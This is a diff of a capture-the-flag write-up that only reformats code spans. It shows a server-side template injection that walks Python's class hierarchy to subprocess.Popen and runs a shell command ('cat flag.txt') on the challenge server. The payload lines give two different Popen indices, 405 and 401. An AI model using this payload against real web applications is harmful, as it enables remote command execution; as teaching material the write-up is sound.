@@ -82,9 +82,9 @@ Template injection is a go!
 Starting with
 
 
-
-`{{''.__class__.__mro__[1].__subclasses__()}}`
-
+```
+{{''.__class__.__mro__[1].__subclasses__()}}
+```
 
 
 we can look for the `'subprocess.Popen'` class
@@ -97,17 +97,17 @@ we can look for the `'subprocess.Popen'` class
 we need it's exact index in the list. Let's use slicing to find it:
 
 
-
-`{{''.__class__.__mro__[1].__subclasses__()[400::]}}`
-
+```
+{{''.__class__.__mro__[1].__subclasses__()[400::]}}
+```
 
 
 By continuously slicing higher indicies, we can track down exactly where `subprocess.Popen` is
 
 
-
-`{{''.__class__.__mro__[1].__subclasses__()[405::]}}`
-
+```
+{{''.__class__.__mro__[1].__subclasses__()[405::]}}
+```
 
 
 ![img](/assets/images/ctf/hacktivitycon-web-templateshack/10.png)
@@ -120,17 +120,17 @@ Now that it's at the top of the list, we know it's at 405
 Payload:
 
 
-
-`{{''.__class__.__mro__[1].__subclasses__()[405]('cat flag.txt',shell=True,stdout=-1).communicate()}}`
-
+```
+{{''.__class__.__mro__[1].__subclasses__()[405]('cat flag.txt',shell=True,stdout=-1).communicate()}}
+```
 
 
 Full url:
 
 
-
-`http://jh2i.com:50023/admin/{{''.__class__.__mro__[1].__subclasses__()[401]('cat flag.txt',shell=True,stdout=-1).communicate()}}`
-
+```
+http://jh2i.com:50023/admin/{{''.__class__.__mro__[1].__subclasses__()[401]('cat flag.txt',shell=True,stdout=-1).communicate()}}
+```
 
 
 ![img](/assets/images/ctf/hacktivitycon-web-templateshack/11.png)
